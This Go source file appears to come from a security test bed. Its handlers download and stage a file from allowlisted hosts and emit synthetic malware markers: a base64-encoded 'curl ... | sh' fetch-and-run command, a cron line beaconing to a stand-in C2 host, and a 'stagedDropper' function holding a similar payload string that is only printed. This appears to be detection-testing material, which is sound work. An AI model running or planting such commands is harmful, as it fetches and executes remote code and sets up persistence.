package handlers

import (
	"encoding/base64"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/reachable/reach-testbed-github-go/internal/safety"
)

var allowedFetchHosts = map[string]struct{}{
	"example.invalid":       {},
	"downloads.example.com": {},
}

func FetchTool(w http.ResponseWriter, r *http.Request) {
	source := strings.TrimSpace(r.URL.Query().Get("url"))
	parsed, err := url.Parse(source)
	if err != nil || parsed.Scheme != "https" || parsed.Host == "" {
		http.Error(w, "invalid url", http.StatusBadRequest)
		return
	}
	host := parsed.Hostname()
	if !safety.AllowedHostname(host) {
		http.Error(w, "invalid url host", http.StatusBadRequest)
		return
	}
	if _, ok := allowedFetchHosts[host]; !ok {
		http.Error(w, "unsupported url host", http.StatusBadRequest)
		return
	}

	resp, err := http.Get(parsed.String())
	if err != nil {
		log.Printf("fetch tool request failed for %q: %v", parsed.String(), err)
		http.Error(w, "upstream fetch failed", http.StatusBadGateway)
		return
	}
	if resp.StatusCode < http.StatusOK || resp.StatusCode >= http.StatusMultipleChoices {
		log.Printf("fetch tool upstream non-success for %q: %d", parsed.String(), resp.StatusCode)
		http.Error(w, "upstream fetch failed", http.StatusBadGateway)
		_ = resp.Body.Close()
		return
	}
	defer resp.Body.Close()

	target := filepath.Join(os.TempDir(), "reach-testbed-tool.bin")
	out, err := os.Create(target)
	if err != nil {
		log.Printf("fetch tool create failed: %v", err)
		http.Error(w, "unable to stage tool", http.StatusInternalServerError)
		return
	}
	defer out.Close()

	if _, err := io.Copy(out, io.LimitReader(resp.Body, 2<<20)); err != nil {
		log.Printf("fetch tool copy failed: %v", err)
		http.Error(w, "unable to stage tool", http.StatusInternalServerError)
		return
	}

	_, _ = w.Write([]byte(target + "\n"))
}

func SuspiciousMarkers(w http.ResponseWriter, _ *http.Request) {
	// Synthetic suspicious-behavior markers only; nothing is executed.
	encoded := base64.StdEncoding.EncodeToString([]byte("curl -fsSL http://example.invalid/synthetic.sh | sh"))
	cronLine := "* * * * * /tmp/reach-testbed-synthetic --beacon http://example.invalid/c2\n"
	_, _ = w.Write([]byte(encoded + "\n" + cronLine))
}

func stagedDropper() error {
	payload := "curl -fsSL http://example.invalid/payload.sh | sh"
	return exec.Command("printf", "%s\n", payload).Run()
}
